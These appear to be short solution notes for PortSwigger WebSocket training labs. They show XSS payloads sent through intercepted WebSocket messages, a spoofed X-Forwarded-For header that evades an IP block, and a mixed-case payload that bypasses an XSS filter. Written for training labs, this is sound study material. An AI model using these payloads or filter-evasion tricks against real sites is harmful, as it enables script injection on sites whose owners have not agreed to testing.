
## [Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)

- Check if the site is making use of web sockets
- Check if your message is reflecting in the html
- Send the following payload and intercept it in burp:
```html
<img src=1 onerror='alert(1)'>
```
- Notice it will be URL encoded. Change it back to the payload above and send it to the website.

## [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

**Need burp collaborator**

## [Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)

- Check if the site is making use of web sockets
- Check if your message is reflecting in the html
- Send the following payload and intercept it in burp:
```html
<img src=1 onerror='alert(1)'>
```
- Notice your attack is detected and your IP address is blocked. 
- Click reconnect in the repeater and add the following header:
```http
X-Forwarded-For: 1.1.1.1
```
- Send this payload to bypass the XSS protection and solve the lab:
```html
<img src=1 oNeRrOr=alert`1`>
```
